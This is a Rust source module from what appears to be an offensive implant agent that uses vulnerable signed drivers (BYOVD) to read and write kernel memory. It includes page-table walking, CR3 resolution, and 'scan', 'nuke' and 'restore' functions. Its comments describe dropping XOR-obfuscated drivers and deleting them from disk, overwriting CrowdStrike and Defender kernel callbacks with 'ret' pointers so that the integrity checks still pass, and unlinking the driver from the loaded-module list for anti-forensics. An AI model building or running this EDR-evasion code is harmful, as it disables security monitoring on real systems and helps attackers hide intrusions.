//! Kernel callback overwrite module (BYOVD — Bring Your Own Vulnerable Driver).
//!
//! This module surgically overwrites EDR kernel callback function pointers to
//! point to a `ret` instruction instead of NULLing them. This defeats EDR
//! self-integrity checks (CrowdStrike, Microsoft Defender for Endpoint) that
//! verify their callbacks are still registered by checking if the pointer is
//! non-NULL. A ret pointer passes these checks (non-NULL, valid executable
//! memory) but causes the callback to immediately return without executing
//! any monitoring logic.
//!
//! # Architecture
//!
//! The module is divided into four sub-modules:
//!
//! - **`driver_db`**: Static database of 8 known vulnerable signed drivers
//!   (Dell, ASUS, Baidu, ENE, Gigabyte, Process Explorer, MSI Afterburner,
//!   WinRing0). Top 3 are embedded (XOR-obfuscated) in the agent binary.
//!
//! - **`deploy`**: Driver deployment — scans for pre-loaded drivers, drops
//!   embedded drivers to disk (obfuscated filename), loads via NtLoadDriver,
//!   deletes file from disk. Obtains device handles for IOCTL communication.
//!
//! - **`discover`**: Callback discovery — reads kernel memory to locate and
//!   enumerate EDR callbacks in PspCreateProcessNotifyRoutine,
//!   PspCreateThreadNotifyRoutine, PspLoadImageNotifyRoutine,
//!   CallbackListHead, and KeBugCheckCallbackListHead.
//!
//! - **`overwrite`**: Surgical overwrite — finds a `ret` instruction in
//!   ntoskrnl.exe, overwrites each EDR callback's function pointer to point
//!   to ret, saves backups for restore, and unlinks the vulnerable driver
//!   from PsLoadedModuleList.
//!
//! # Safety
//!
//! - KeBugCheckCallbackListHead entries are **never** overwritten (BSOD risk)
//! - Original pointers are saved for `KernelCallbackRestore`
//! - Failed physical memory writes are skipped (no garbage writes)
//! - Driver is unlinked from PsLoadedModuleList after overwrite
//!
//! # NT API Usage
//!
//! All NT API calls go through `syscall!`.
//! All strings through `string_crypt`.

pub mod deploy;
pub mod discover;
pub mod driver_db;
pub mod overwrite;
pub mod proxy;

use anyhow::{bail, Context, Result};

// ── Shared VA→PA translation ───────────────────────────────────────────────
// Used by both `discover` and `overwrite` sub-modules to avoid duplicating
// the 4-level x64 page-table walk logic.

/// Perform a page-table walk to translate a virtual address to a physical
/// address.
///
/// Dispatches to the architecture-specific implementation:
/// - **x86_64**: 4-level paging (PML4 → PDPT → PD → PT → page).
///   Uses bits 12..51 as PFN, bit 0 as present, bit 7 as page size.
/// - **aarch64**: ARM64 Windows uses 3-level or 4-level paging depending
///   on the VA size (48-bit or 52-bit with LVA).  Windows on ARM64 uses
///   4 KB pages with 48-bit VA by default, giving a 4-level walk
///   (PGD → PUD → PMD → PTE → page).  ARM64 page-table entries use
///   bit 0 as the valid bit and bits 12..51 (or 12..47 + high bits)
///   as the output address (next-level PA or page PA).
///
/// # Arguments
/// * `driver`         — The vulnerable driver in use.
/// * `device_handle`  — Open handle to the driver's device.
/// * `cr3`            — Root page-table physical address (from
///                       DirectoryTableBase / TTBR0_EL1).  Only the PFN
///                       bits are used.
/// * `virtual_address`— The virtual address to translate.
///
/// # Returns
/// The corresponding physical address on success.
pub fn translate_va_to_pa(
    driver: &driver_db::VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    virtual_address: u64,
) -> Result<u64> {
    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
        let mut buf = [0u8; 8];
        unsafe {
            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
        }
        Ok(u64::from_le_bytes(buf))
    };

    #[cfg(target_arch = "x86_64")]
    {
        translate_va_to_pa_x64(virtual_address, cr3, &read_entry)
    }

    #[cfg(target_arch = "aarch64")]
    {
        translate_va_to_pa_arm64(virtual_address, cr3, &read_entry)
    }
}

/// x86-64 4-level page-table walk (PML4 → PDPT → PD → PT → page).
///
/// VA layout: [63:48] sign-ext, [47:39] PML4, [38:30] PDPT, [29:21] PD,
/// [20:12] PT, [11:0] offset.  Each entry: bit 0 = present, bit 7 = PS
/// (large page), bits 12..51 = next-level PFN.
#[cfg(target_arch = "x86_64")]
fn translate_va_to_pa_x64(
    virtual_address: u64,
    cr3: u64,
    read_entry: &dyn Fn(u64, u64) -> Result<u64>,
) -> Result<u64> {
    let pml4_idx = (virtual_address >> 39) & 0x1FF;
    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
    let pd_idx = (virtual_address >> 21) & 0x1FF;
    let pt_idx = (virtual_address >> 12) & 0x1FF;
    let offset = virtual_address & 0xFFF;

    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
    const PTE_PRESENT: u64 = 1;
    const PTE_PS: u64 = 1 << 7;

    // Level 1 — PML4
    let pml4_base = cr3 & PFN_MASK;
    let pml4e = read_entry(pml4_base, pml4_idx)?;
    if pml4e & PTE_PRESENT == 0 {
        bail!(
            "PML4E not present for VA 0x{:016X} (PML4 base 0x{:016X}, idx {})",
            virtual_address,
            pml4_base,
            pml4_idx
        );
    }

    // Level 2 — PDPT
    let pdpt_base = pml4e & PFN_MASK;
    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
    if pdpte & PTE_PRESENT == 0 {
        bail!(
            "PDPTE not present for VA 0x{:016X} (PDPT base 0x{:016X}, idx {})",
            virtual_address,
            pdpt_base,
            pdpt_idx
        );
    }
    // 1 GB large page
    if pdpte & PTE_PS != 0 {
        let phys = (pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF);
        return Ok(phys);
    }

    // Level 3 — PD
    let pd_base = pdpte & PFN_MASK;
    let pde = read_entry(pd_base, pd_idx)?;
    if pde & PTE_PRESENT == 0 {
        bail!(
            "PDE not present for VA 0x{:016X} (PD base 0x{:016X}, idx {})",
            virtual_address,
            pd_base,
            pd_idx
        );
    }
    // 2 MB large page
    if pde & PTE_PS != 0 {
        let phys = (pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF);
        return Ok(phys);
    }

    // Level 4 — PT
    let pt_base = pde & PFN_MASK;
    let pte = read_entry(pt_base, pt_idx)?;
    if pte & PTE_PRESENT == 0 {
        bail!(
            "PTE not present for VA 0x{:016X} (PT base 0x{:016X}, idx {})",
            virtual_address,
            pt_base,
            pt_idx
        );
    }

    let phys_page = pte & PFN_MASK;
    Ok(phys_page + offset)
}

/// ARM64 page-table walk for Windows on ARM64.
///
/// ARM64 Windows uses 4 KB pages with 48-bit virtual addresses, giving a
/// 4-level walk using 9 bits per level:
///
/// VA layout (48-bit, 4 KB granule):
///   [47:39] Level 0 index (PGD)  — 9 bits
///   [38:30] Level 1 index (PUD)  — 9 bits
///   [29:21] Level 2 index (PMD)  — 9 bits
///   [20:12] Level 3 index (PTE)  — 9 bits
///   [11: 0] Page offset          — 12 bits
///
/// ARM64 page-table entry format (VMSAv8-A):
///   Bit 0:    Valid (1 = entry is valid)
///   Bit 1:    Table / Page (1 = table descriptor at L0-L2, ignored at L3)
///   Bits 12-51: Output address (next-level PA or page PA)
///   Bit 52-58: Ignored / software-use
///   Bit 59-63: Ignored / software-use
///
/// Block descriptors (large pages):
///   At L1: 1 GB block (bits 30..51 = output address)
///   At L2: 2 MB block (bits 21..51 = output address)
///
/// Note: ARM64 uses TTBR0 (user-space) and TTBR1 (kernel-space).
/// On Windows, the kernel VA space uses TTBR1_EL1.  The root PA
/// comes from TTBR1_EL1 (equivalent to CR3 on x86-64), which
/// Windows stores in EPROCESS.DirectoryTableBase for the kernel
/// half.  For kernel VA translation, we use the same TTBR1 root.
#[cfg(target_arch = "aarch64")]
fn translate_va_to_pa_arm64(
    virtual_address: u64,
    ttbr1: u64,
    read_entry: &dyn Fn(u64, u64) -> Result<u64>,
) -> Result<u64> {
    let l0_idx = (virtual_address >> 39) & 0x1FF;
    let l1_idx = (virtual_address >> 30) & 0x1FF;
    let l2_idx = (virtual_address >> 21) & 0x1FF;
    let l3_idx = (virtual_address >> 12) & 0x1FF;
    let offset = virtual_address & 0xFFF;

    // ARM64 descriptor masks.
    // Valid bit (bit 0).
    const DESC_VALID: u64 = 1;
    // Table descriptor bit (bit 1).  Must be 1 for table entries
    // (points to next-level table).  Block descriptors at L1/L2
    // have bit 1 = 0 but bit 0 = 1.
    const DESC_TABLE: u64 = 1 << 1;
    // Output address mask: bits 12..51 (4 KB aligned physical address
    // for next-level table or page frame).
    const OUTPUT_ADDR_MASK: u64 = 0x0000_FFFF_FFFF_F000;
    // Block address masks.
    // L1 block: 1 GB aligned → bits 30..51
    const L1_BLOCK_MASK: u64 = 0x0000_FFFF_C000_0000;
    // L2 block: 2 MB aligned → bits 21..51
    const L2_BLOCK_MASK: u64 = 0x0000_FFFF_FFE0_0000;

    // Level 0 — PGD (Page Global Directory)
    let l0_base = ttbr1 & OUTPUT_ADDR_MASK;
    let l0e = read_entry(l0_base, l0_idx)?;
    if l0e & DESC_VALID == 0 {
        bail!(
            "ARM64: L0 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
            virtual_address,
            l0_base,
            l0_idx
        );
    }
    // L0 must be a table descriptor (bit 1 = 1).  Block descriptors
    // are not supported at L0.
    if l0e & DESC_TABLE == 0 {
        bail!(
            "ARM64: L0 entry is not a table descriptor for VA 0x{:016X}",
            virtual_address
        );
    }

    // Level 1 — PUD (Page Upper Directory)
    let l1_base = l0e & OUTPUT_ADDR_MASK;
    let l1e = read_entry(l1_base, l1_idx)?;
    if l1e & DESC_VALID == 0 {
        bail!(
            "ARM64: L1 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
            virtual_address,
            l1_base,
            l1_idx
        );
    }
    // Check for 1 GB block descriptor: valid=1, table=0 at L1.
    if l1e & DESC_TABLE == 0 {
        let phys = (l1e & L1_BLOCK_MASK) + (virtual_address & 0x3FFF_FFFF);
        return Ok(phys);
    }

    // Level 2 — PMD (Page Middle Directory)
    let l2_base = l1e & OUTPUT_ADDR_MASK;
    let l2e = read_entry(l2_base, l2_idx)?;
    if l2e & DESC_VALID == 0 {
        bail!(
            "ARM64: L2 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
            virtual_address,
            l2_base,
            l2_idx
        );
    }
    // Check for 2 MB block descriptor: valid=1, table=0 at L2.
    if l2e & DESC_TABLE == 0 {
        let phys = (l2e & L2_BLOCK_MASK) + (virtual_address & 0x1F_FFFF);
        return Ok(phys);
    }

    // Level 3 — PTE (Page Table Entry)
    let l3_base = l2e & OUTPUT_ADDR_MASK;
    let l3e = read_entry(l3_base, l3_idx)?;
    // L3 entries: valid=1, bit 1 must be 1 (page descriptor).
    // A page descriptor at L3 has both bit 0 and bit 1 set.
    if l3e & DESC_VALID == 0 {
        bail!(
            "ARM64: L3 PTE not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
            virtual_address,
            l3_base,
            l3_idx
        );
    }

    let phys_page = l3e & OUTPUT_ADDR_MASK;
    Ok(phys_page + offset)
}

// ── Build-specific DirectoryTableBase offset ───────────────────────────────

/// Build-to-offset table for `_KPROCESS.DirectoryTableBase`.
///
/// The offset of `DirectoryTableBase` within `_KPROCESS` (which is embedded
/// at the start of `_EPROCESS`) varies across Windows builds and
/// architectures.
///
/// Returns the offset from the highest entry whose build ≤ the requested
/// build, allowing forward-compatible approximation for minor updates.
/// If the build is not in the table (or older than the minimum), `None` is
/// returned and the caller must refuse to operate.
///
/// # x86-64 offsets
///
/// On all currently-supported x64 builds it is `0x28`:
///
/// | Field                     | Offset |
/// |---------------------------|--------|
/// | Header                    | 0x000  |
/// | ProfileSwitched           | ...    |
/// | DirectoryTableBase        | 0x028  |
///
/// # ARM64 offsets
///
/// ARM64 Windows has a different `_KPROCESS` layout due to architectural
/// differences (no TEB-based KTHREAD pointer, different register save area):
///
/// | Field                     | Offset |
/// |---------------------------|--------|
/// | Header                    | 0x000  |
/// | DirectoryTableBase        | 0x040  |
///
/// These offsets were verified against public PDB symbols for the listed
/// builds.  When in doubt, the caller should refuse to operate.
#[cfg(target_arch = "x86_64")]
const DTB_OFFSETS: &[(u32, usize)] = &[
    // Windows 10 2004 / 20H2 / 21H1 / 21H2
    (19041, 0x28),
    (19042, 0x28),
    (19044, 0x28),
    // Windows 10 22H2
    (19045, 0x28),
    // Windows 11 21H2
    (22000, 0x28),
    // Windows 11 22H2
    (22621, 0x28),
    // Windows 11 23H2
    (22631, 0x28),
    // Windows 11 24H2
    (26100, 0x28),
];

/// ARM64 build-to-offset table for `_KPROCESS.DirectoryTableBase`.
///
/// ARM64 Windows has a different KPROCESS layout.  The DirectoryTableBase
/// field stores the TTBR0/TTBR1 value (equivalent to CR3 on x86-64).
/// Offset 0x040 verified against ARM64 Windows 11 PDB symbols.
#[cfg(target_arch = "aarch64")]
const DTB_OFFSETS: &[(u32, usize)] = &[
    // Windows 11 21H2 (ARM64)
    (22000, 0x040),
    // Windows 11 22H2 (ARM64)
    (22621, 0x040),
    // Windows 11 23H2 (ARM64)
    (22631, 0x040),
    // Windows 11 24H2 (ARM64)
    (26100, 0x040),
];

/// Look up the `_KPROCESS.DirectoryTableBase` offset for a given build number.
///
/// Returns the offset from the highest entry whose build ≤ the requested
/// build, or `None` if the build is older than the minimum known entry.
pub fn dtb_offset_for_build(build: u32) -> Option<usize> {
    let mut best: Option<usize> = None;
    for &(b, off) in DTB_OFFSETS {
        if b <= build {
            best = Some(off);
        } else {
            break; // table is sorted ascending
        }
    }
    best
}

/// Resolve CR3 / TTBR (DirectoryTableBase) by reading the initial system process.
///
/// On x86-64 and ARM64 Windows the kernel shares a single page-table root
/// for all processes via the `_KPROCESS.DirectoryTableBase` field.  We
/// resolve `PsInitialSystemProcess`, read the _EPROCESS, and extract the
/// value at a build- and architecture-specific offset.
///
/// On x86-64 this value is CR3; on ARM64 it is TTBR0_EL1 / TTBR1_EL1
/// (stored in the same DirectoryTableBase field).
///
/// # Safety / Conservatism
/// If the Windows build number is not in the known-offset table, this
/// function logs a warning and returns an error rather than risking
/// corrupting kernel memory with a wrong offset.
pub fn resolve_cr3(
    driver: &driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Result<u64> {
    // Look up the DirectoryTableBase offset for the current build.
    let build = crate::syscalls::get_build_number();
    let dtb_offset = dtb_offset_for_build(build).with_context(|| {
        format!(
            "unknown Windows build {} — cannot safely determine \
             DirectoryTableBase offset; refusing to operate",
            build
        )
    })?;
    // Resolve PsInitialSystemProcess — points to the initial _EPROCESS.
    let eprocess = discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsInitialSystemProcess",
    )
    .context("failed to resolve PsInitialSystemProcess")?;

    // PsInitialSystemProcess is a pointer to _EPROCESS.  Read the pointer.
    let mut ptr_buf = [0u8; 8];
    // This first read is a kernel virtual address.  Most drivers handle
    // VA fine (MmMapIoSpace), so we use the raw address.  If the driver
    // needs physical addresses, we have a chicken-and-egg problem: we
    // need CR3 to translate, but we need to read to get CR3.  The
    // solution is that PsInitialSystemProcess lives in the kernel's
    // .data section which is mapped 1:1 via the HAL identity mapping
    // (MmGetPhysicalAddress works even without our translation).
    unsafe {
        deploy::read_physical_memory(driver, device_handle, eprocess, &mut ptr_buf)?;
    }
    let eprocess_addr = u64::from_le_bytes(ptr_buf);

    if eprocess_addr == 0 {
        bail!("PsInitialSystemProcess is NULL");
    }

    // _KPROCESS is embedded at the start of _EPROCESS.
    // DirectoryTableBase offset is build-specific (see DTB_OFFSETS table).
    let directory_table_base_offset = dtb_offset as u64;
    let mut cr3_buf = [0u8; 8];
    unsafe {
        deploy::read_physical_memory(
            driver,
            device_handle,
            eprocess_addr + directory_table_base_offset,
            &mut cr3_buf,
        )?;
    }
    let cr3 = u64::from_le_bytes(cr3_buf);

    if cr3 == 0 || cr3 & 0xFFF != 0 {
        bail!(
            "Invalid CR3 value read from DirectoryTableBase: 0x{:016X}",
            cr3
        );
    }

    tracing::info!(
        "Resolved CR3 from PsInitialSystemProcess: 0x{:016X} (build={}, DTB offset=0x{:X})",
        cr3,
        build,
        directory_table_base_offset
    );
    Ok(cr3)
}

/// Perform a kernel callback scan: discover all registered EDR callbacks.
///
/// # Returns
/// JSON-serialized scan result on success.
pub fn scan(session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed =
        deploy::deploy(&[], session_key).context("failed to deploy vulnerable driver for scan")?;

    // Step 2: Scan for callbacks.
    let result = discover::scan_callbacks(&deployed).context("callback scan failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result).unwrap_or_else(|_| {
        format!(
            "{{\"error\": \"serialization failed\", \"total_count\": {}}}",
            result.total_count
        )
    });

    // If we freshly deployed the driver, clean it up after scan-only.
    if !deployed.was_preloaded {
        unsafe {
            let _ = deploy::cleanup_driver();
        }
    }

    Ok(json)
}

/// Perform a kernel callback nuke: overwrite EDR callbacks with ret.
///
/// # Arguments
/// * `preferred_drivers` - Optional list of driver names to try (empty = all)
/// * `session_key` - HKDF session key for driver resource decryption
///
/// # Returns
/// JSON-serialized nuke result on success.
pub fn nuke(preferred_drivers: &[String], session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed = deploy::deploy(preferred_drivers, session_key)
        .context("failed to deploy vulnerable driver for nuke")?;

    // Step 2: Perform the overwrite.
    let result = overwrite::nuke_callbacks(&deployed).context("callback nuke failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    // Note: We do NOT clean up the driver here. The driver stays loaded
    // for the restore operation. The overwrite module already unlinks it
    // from PsLoadedModuleList for anti-forensic purposes.

    Ok(json)
}

/// Restore all previously overwritten kernel callback pointers.
///
/// # Returns
/// JSON-serialized restore result on success.
pub fn restore(session_key: &[u8]) -> Result<String> {
    // Check if we have backups to restore.
    if !overwrite::has_backups() {
        return Err(anyhow::anyhow!(
            "no callback backups available for restore (no prior KernelCallbackNuke in this session)"
        ));
    }

    // We need the deployed driver for physical memory write access.
    // Try to get the currently deployed one, or deploy a new one.
    let deployed = match deploy::get_deployed_driver() {
        Some(d) => d,
        None => deploy::deploy(&[], session_key)
            .context("failed to deploy vulnerable driver for restore")?,
    };

    // Restore the callbacks.
    let result = overwrite::restore_callbacks(&deployed).context("callback restore failed")?;

    // Now clean up the driver deployment.
    unsafe {
        let _ = deploy::cleanup_driver();
    }

    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    Ok(json)
}

/// Get a status summary of the kernel callback subsystem.
///
/// Returns JSON with: backup count, deployed driver status, etc.
pub fn status() -> String {
    let backup_count = overwrite::get_backup_snapshot().len();
    let deployed = deploy::get_deployed_driver();

    let status = serde_json::json!({
        "backups_available": backup_count,
        "driver_deployed": deployed.is_some(),
        "driver_name": deployed.as_ref().map(|d| d.driver.name).unwrap_or("none"),
        "driver_preloaded": deployed.as_ref().map(|d| d.was_preloaded).unwrap_or(false),
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}
